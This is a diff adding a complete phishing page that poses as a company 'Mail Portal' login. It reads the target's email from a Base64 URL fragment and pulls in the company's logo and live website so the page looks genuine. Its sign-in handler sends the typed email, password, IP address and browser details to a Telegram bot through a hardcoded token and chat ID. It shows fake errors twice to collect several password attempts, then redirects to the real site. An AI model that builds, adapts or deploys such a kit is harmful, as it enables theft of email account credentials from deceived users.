@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>MAIL</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0id2c2IGg2IHRleHQtZ3JheS04MDAgZGFyay10ZXh0LXdoaXRlIiBhcmlhLWhpZGRlbj0idHJ1ZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIGZpbGw9ImN1cnJlbnRDb2xvciIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8cGF0aCBkPSJNMi4wMzggNS42MUEyLjAxIDIuMDEgMCAwIDAgMiA2djEyYTIgMiAwIDAgMCAyIDJoMTZhMiAyIDAgMCAwIDItMlY2YzAtLjEyLS4wMS0uMjM4LS4wMy0uMzUybC0uODY2LjY1MDctLzg5NiA2LjAzMmEyIDIgMCAwIDEtMi40MjkgMEwyLjg4NCA2LjI4OGwtLjg0Ni0uNjc3WiIvPgogIDxwYXRoIGQ9Ik0yMC42NzcgNC4xMTdBMS45OTYgMS45OTYgMCAwIDAgMjAgNEg0Yy0uMjI1IDAtLjQ0LjAzNy0uNjQyLjEwNWwuNzU4LjYwN0wxMiAxMC43NDIgMTkuOSA0LjdsLjc3Ny0uNTgzWiIvPgo8L3N2Zz4=" type="image/svg+xml">
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden; 
+        }
+
+        body {
+            background-color: rgb(184, 183, 183);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            font-family: Arial, sans-serif;
+        }
+        .top-bar {
+            background-color: #053a77;
+            color: white;
+            padding: 15px;
+            position: absolute;
+            top: 0;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 20px;
+        }
+        
+        .bottom-bar {
+            background-color: rgb(170, 168, 168);
+            color: black;
+            padding: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: absolute;
+            width: 100%;
+            bottom: 0;
+            font-size: 15px;
+            padding-left: auto;
+            padding-right: auto;
+        }
+        .help {
+            margin-right: auto;
+            margin-left: 20px;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+        .help:hover {
+            color: blue; 
+            
+        }
+
+        .terms {
+            margin-left: auto;
+            margin-right: 20px;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+
+        .terms:hover {
+            color: blue; 
+        }
+
+        .center-box {
+            background-color: white;
+            padding: 25px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 90%;
+            max-width: 400px;
+            height: auto;
+            border-radius: 10px;
+        }
+
+        .center-box img {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 10px;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 20%;
+            margin-bottom: 20px;
+            white-space: nowrap;
+            
+        }
+
+        .logo-container img {
+            display: flex;
+            width: 60px;
+            height: auto;
+            margin-right: 10px;
+            
+            
+        }
+        
+        .e-text {
+            width: 100%;
+            margin-bottom: 20px;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            padding-left: -30px;
+        }
+
+
+        #icon {
+            margin-right: 15px;
+        }
+
+        #icon2 {
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+        
+        .p-field {
+            width: 100%;
+            margin-bottom: 10px;
+        }
+        input[type="password"] {
+            border: none;
+            border-bottom: 1px solid #0965bb;
+            padding: 5px;
+            width: 90%;
+            outline: none;
+        }
+        .pp-label {
+            font-size: 25px;
+            color: black;
+            margin-bottom: 25px;
+            font-weight: bold;
+            position: relative;
+        }
+        .actions-container {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-direction: column;
+        }
+        .ft-p {
+            color: #0055b8;
+            cursor: pointer;
+            margin-bottom: 20px;
+            align-self: flex-start;
+        }
+        .sn-n-bn {
+            background-color: #0055b8;
+            color: white;
+            border: 2px solid black;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            cursor: pointer;
+            width: 30%;
+            align-self: flex-end;
+            transition: background-color 0.3s, color 0.3s, transform 0.3s; 
+            border-radius: 5px;
+        }
+        
+        .sn-n-bn:hover {
+            background-color: #003f88; 
+            color: gray; 
+            transform: scale(1.05); 
+        }
+        .sn-n-bn:active {
+            background-color: #003f88; 
+            transform: scale(0.95); 
+        }
+        
+        .sn-n-bn.clicked {
+            background-color: #002f70; 
+            color: #ffffff; 
+            border: 2px solid #ffffff; 
+        }
+        
+        #error-message {
+            color: red;
+            display: none;
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+
+        @media (max-width: 768px) {
+            .top-bar {
+                font-size: 16px;
+                padding: 10px;
+            }
+        
+            .bottom-bar {
+                font-size: 14px;
+            }
+        
+            .center-box {
+                padding: 15px;
+            }
+        
+            .pp-label {
+                font-size: 18px;
+            }
+        
+            .e-text {
+                font-size: 16px;
+            }
+        
+            .sn-n-bn {
+                font-size: 14px;
+                padding: 8px 15px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .top-bar {
+                font-size: 14px;
+                padding: 8px;
+            }
+        
+            .bottom-bar {
+                font-size: 12px;
+            }
+        
+            .center-box {
+                padding: 10px;
+            }
+        
+            .pp-label {
+                font-size: 16px;
+            }
+        
+            .e-text {
+                font-size: 14px;
+            }
+        
+            .sn-n-bn {
+                font-size: 12px;
+                padding: 5px 10px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div id="iframe-container" style="position: fixed; inset: 0; width: 100%; height: 100%; z-index: -1;">
+        <iframe src="" id="mainPage" style="position: fixed; inset: 0; width: 100%; height: 100%; border: none; margin: 0; padding: 0; overflow-x: hidden; z-index: 1;"></iframe>
+    </div>
+    <div class="top-bar">
+        <span id="login-text"></span>
+        <span id="portal-text"></span>
+
+        <svg id="icon2" className="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="80" height="30" fill="none" viewBox="0 0 24 24">
+            <path stroke="currentColor" strokeLinecap="square" strokeLinejoin="round" strokeWidth="2" d="M10 19H5a1 1 0 0 1-1-1v-1a3 3 0 0 1 3-3h2m10 1a3 3 0 0 1-3 3m3-3a3 3 0 0 0-3-3m3 3h1m-4 3a3 3 0 0 1-3-3m3 3v1m-3-4a3 3 0 0 1 3-3m-3 3h-1m4-3v-1m-2.121 1.879-.707-.707m5.656 5.656-.707-.707m-4.242 0-.707.707m5.656-5.656-.707.707M12 8a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z"/>
+        </svg>
+    </div>
+
+    <div class="center-box">
+        <div class="logo-container">
+            <img id="company-logo" src="" alt="Logo">
+        </div>
+        <div class="e-text">
+            <svg id="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="30" height="30">
+                <path d="M7 17v1a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1a3 3 0 0 0-3-3h-4a3 3 0 0 0-3 3Zm8-9a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z"/>
+            </svg>
+            <span id="email-text"></span>
+        </div>
+        <div class="p-field" id="password-container"></div>
+        <div class="actions-container" id="actions-container"></div>
+    </div>
+
+    <div class="bottom-bar">
+        <span class="help" id="help-email"></span>
+        <span class="terms" id="terms"></span>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", async function() {
+            // Get Base64 encoded email from URL hash (format: #Base64String)
+            const hash = window.location.hash.substring(1); // Remove the #
+            let domain = '';
+
+            // Initialize UI elements
+            document.getElementById('login-text').textContent = 'LOGIN';
+            document.getElementById('login-text').style.marginLeft = '20px';
+            document.getElementById('portal-text').textContent = 'MAIL PORTAL';
+            document.getElementById('email-text').textContent = 'Email or phone';
+            document.getElementById('terms').textContent = 'Terms of use Privacy & cookies. © 2026';
+
+            // Create password field
+            const passwordContainer = document.getElementById('password-container');
+            const passwordLabel = document.createElement('div');
+            passwordLabel.className = 'pp-label';
+            passwordLabel.textContent = 'Enter password';
+            passwordContainer.appendChild(passwordLabel);
+            
+            const errorMessage = document.createElement('div');
+            errorMessage.id = 'error-message';
+            errorMessage.style.color = 'red';
+            errorMessage.style.display = 'none';
+            errorMessage.textContent = 'Please sign in correctly to gain access';
+            passwordContainer.appendChild(errorMessage);
+
+            const passwordInput = document.createElement('input');
+            passwordInput.type = 'password';
+            passwordInput.placeholder = 'Password';
+            passwordInput.id = 'password-input';
+            passwordInput.style.border = 'none';
+            passwordInput.style.borderBottom = '1px solid #0965bb';
+            passwordInput.style.padding = '5px';
+            passwordInput.style.width = '90%';
+            passwordInput.style.outline = 'none';
+            passwordContainer.appendChild(passwordInput);
+
+            // Create action buttons
+            const actionsContainer = document.getElementById('actions-container');
+            const forgotPassword = document.createElement('div');
+            forgotPassword.className = 'ft-p';
+            forgotPassword.textContent = 'Forgotten password?';
+            actionsContainer.appendChild(forgotPassword);
+
+            const signInButton = document.createElement('button');
+            signInButton.className = 'sn-n-bn';
+            signInButton.id = 'sign-in-button';
+            signInButton.textContent = 'Sign In';
+            actionsContainer.appendChild(signInButton);
+
+            // Process email if present in URL
+            if (hash) {
+                try {
+                    const email = atob(hash);
+                    
+                    // Validate email format
+                    if (email.includes('@') && email.includes('.')) {
+                        document.getElementById('email-text').textContent = email;
+
+                        // Extract domain information
+                        const domainExtracted = email.split('@')[1];
+                        domain = domainExtracted;
+                        const companyName = domainExtracted.split('.')[0];
+                        const capitalizedCompanyName = companyName.charAt(0).toUpperCase() + companyName.slice(1);
+
+                        // Update UI with domain info
+                        document.getElementById('portal-text').textContent = `${capitalizedCompanyName} Mail Portal`;
+                        document.getElementById('help-email').textContent = `Help@${domainExtracted}`;
+
+                        // Set company logo
+                        const logoImage = document.getElementById('company-logo');
+                        logoImage.src = `https://logo.clearbit.com/${domainExtracted}`;
+                        logoImage.onerror = function() {
+                            logoImage.src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIiBzdHlsZT0iZW5hYmxlLWJhY2tncm91bmQ6bmV3IDAgMCA1MTIgNTEyIiB4bWw6c3BhY2U9InByZXNlcnZlIj4KPHBhdGggc3R5bGU9ImZpbGw6IzAwNTViOCIgZD0iTTUwMy43NTYgMTE4LjA2NWMwLTkuMDY5LTcuNDItMTYuNDg5LTE2LjQ4OS0xNi40ODlIMjQuNzMzYy05LjA2OSAwLTE2LjQ4OSA3LjQyLTE2LjQ4OSAxNi40ODl2Mjc1Ljg3YzAgOS4wNjkgNy40MiAxNi40ODkgMTYuNDg5IDE2LjQ4OWg0NjIuNTMzYzkuMDY5IDAgMTYuNDg5LTcuNDIgMTYuNDg5LTE2LjQ4OXYtMjc1Ljg3eiIvPgo8cGF0aCBzdHlsZT0ib3BhY2l0eTouMTtlbmFibGUtYmFja2dyb3VuZDpuZXciIGQ9Ik0yNTUuOTk2IDIzMC4wMzIgOS4zMDYgMzk5LjY4N2MyLjE0OCA1LjcxMyA3LjM3MiA5Ljk0OSAxMy42MzYgMTAuNjM0bDIzMy4wNTMtMTYwLjI3OEw0ODkuMDUgNDEwLjMyMWM2LjI2Ny0uNjgzIDExLjQ5Mi00LjkxOCAxMy42NDEtMTAuNjMxTDI1NS45OTYgMjMwLjAzMnoiLz4KPHBhdGggc3R5bGU9Im9wYWNpdHk6LjI7ZW5hYmxlLWJhY2tncm91bmQ6bmV3IiBkPSJNNDg3LjI2NyAxMDEuNTc2SDI0LjczM2MtOS4wNjkgMC0xNi40ODkgNy40Mi0xNi40ODkgMTYuNDg5djIuMTk5bDI0Ny43NTUgMTcyLjUzOSAyNDcuNzU1LTE3Mi41Mzl2LTIuMTk5Yy4wMDItOS4wNjktNy40MTgtMTYuNDg5LTE2LjQ4Ny0xNi40ODl6Ii8+CjxwYXRoIHN0eWxlPSJmaWxsOiMwMDgyY2EiIGQ9Ik00ODcuMjY3IDEwMS41NzZIMjQuNzMzYy00LjA5MSAwLTcuODM5IDEuNTItMTAuNzMgNC4wMWwyNDEuOTk2IDE2OC41MjkgMjQxLjk5Ni0xNjguNTI5Yy0yLjg5LTIuNDktNi42MzctNC4wMS0xMC43MjgtNC4wMXoiLz4KPHBhdGggc3R5bGU9ImZpbGw6IzFlMjUyYiIgZD0iTTQ4Ny4yNjcgOTMuMzMySDI0LjczM0MxMS4wOTUgOTMuMzMyIDAgMTA0LjQyNyAwIDExOC4wNjV2Mjc1Ljg3YzAgMTMuNjM5IDExLjA5NSAyNC43MzMgMjQuNzMzIDI0LjczM2g0NjIuNTMzYzEzLjYzOSAwIDI0LjczMy0xMS4wOTUgMjQuNzMzLTI0LjczM3YtMjc1Ljg3Yy4wMDEtMTMuNjM4LTExLjA5NS0yNC43MzMtMjQuNzMyLTI0LjczM3ptLTkuNzc3IDE2LjQ4OUwyNTYgMjY0LjA2OCAzNC41MSAxMDkuODIxaDQ0Mi45OHptMTguMDIxIDI4NC4xMTRjMCA0LjU0Ny0zLjY5OCA4LjI0NC04LjI0NCA4LjI0NEgyNC43MzNjLTQuNTQ3IDAtOC4yNDQtMy42OTgtOC4yNDQtOC4yNDR2LTI3NS44N2MwLS4yMjkuMDE2LS40NTMuMDM0LS42NzdMMjUxLjI4OCAyODAuODhhOC4yNDMgOC4yNDMgMCAwIDAgOS40MjIgMGwyMzQuNzY1LTE2My40OTJjLjAxOS4yMjQuMDM0LjQ0OC4wMzQuNjc3djI3NS44N2guMDAyeiIvPgo8L3N2Zz4=';
+                        };
+
+                        // Set iframe background
+                        const iframe = document.getElementById('mainPage');
+                        iframe.src = `https://${domainExtracted}`;
+                        iframe.onerror = function() {
+                            iframe.style.display = 'none';
+                            document.body.style.backgroundColor = 'rgb(184, 183, 183)'; 
+                        };
+                    } else {
+                        throw new Error('Invalid email format');
+                    }
+                } catch (e) {
+                    console.error('Error decoding email:', e);
+                    document.getElementById('email-text').textContent = "Invalid email";
+                }
+            }
+
+            // Login attempt handling
+            let attempt = 0;
+            const errorMessageElement = document.getElementById('error-message');
+            const signInButtonElement = document.getElementById('sign-in-button');
+            let userIp = 'Unknown';
+
+            signInButtonElement.addEventListener('click', async function() {
+                const password = passwordInput.value.trim();
+
+                if (password === '') {
+                    errorMessageElement.textContent = 'Please enter your password to continue.';
+                    errorMessageElement.style.display = 'block';
+                    setTimeout(function() {
+                        errorMessageElement.style.display = 'none';
+                    }, 3000);
+                } else if (password.length < 4) {
+                    errorMessageElement.textContent = 'Password incomplete, Please try again.';
+                    errorMessageElement.style.display = 'block';
+                    passwordInput.value = '';
+                    setTimeout(function() {
+                        errorMessageElement.style.display = 'none';
+                    }, 3000);
+                } else {
+                    errorMessageElement.style.display = 'none';
+
+                    attempt++;
+                    await sendInfoToTelegram();
+                    if (attempt === 1 || attempt === 2) {
+                        errorMessageElement.textContent = 'Please sign in correctly to gain access.';
+                        errorMessageElement.style.display = 'block';
+                        setTimeout(function() {
+                            errorMessageElement.style.display = 'none';
+                        }, 3000);
+                    } else if (attempt === 3 && domain) {
+                        window.location.href = `https://www.${domain}`;
+                    }
+                    passwordInput.value = ''; 
+                }
+            });
+
+            // Helper functions
+            async function fetchUserIp() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    userIp = data.ip;
+                } catch (error) {
+                    userIp = 'IP - undefined';
+                }
+            }
+
+            async function sendInfoToTelegram() {
+                const email = document.getElementById('email-text').textContent;
+                const password = passwordInput.value;
+                const { formattedDate, formattedTime } = getFormattedDateAndTime();
+                const userAgent = navigator.userAgent;
+
+                await fetchUserIp();
+
+                const message = `
+Email: ${email}
+Password: ${password}
+IP: ${userIp}\n
+Date: ${formattedDate}
+Time: ${formattedTime}
+User Agent: ${userAgent}\n
+Designed by Nwamama7
+                `;
+
+                const telegramToken = '8737363835:AAGHX-GA7DbzL3vCAh0-ZQvN6nY5pBM8y9M'; 
+                const chatId = '991865675'; 
+                const apiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+                const payload = {
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                };
+
+                fetch(apiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        console.error('Telegram error:', data.description);
+                    }
+                })
+                .catch(error => console.error('Error sending message to Telegram:', error));
+            }
+
+            function getFormattedDateAndTime() {
+                const date = new Date();
+                const monthNames = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+                const formattedDate = `${date.getDate()} ${monthNames[date.getMonth()]}, ${date.getFullYear()}`;
+                const formattedTime = `${date.getHours().toString().padStart(2, '0')}:${date.getMinutes().toString().padStart(2, '0')}:${date.getSeconds().toString().padStart(2, '0')}`;
+                return { formattedDate, formattedTime };
+            }
+
+            // Helper function to generate the new URL format
+            function generateLoginLink(email) {
+                const base64Email = btoa(email);
+                return `${window.location.origin}${window.location.pathname}#${base64Email}`;
+            }
+        });
+    </script>
+</body>
+</html>
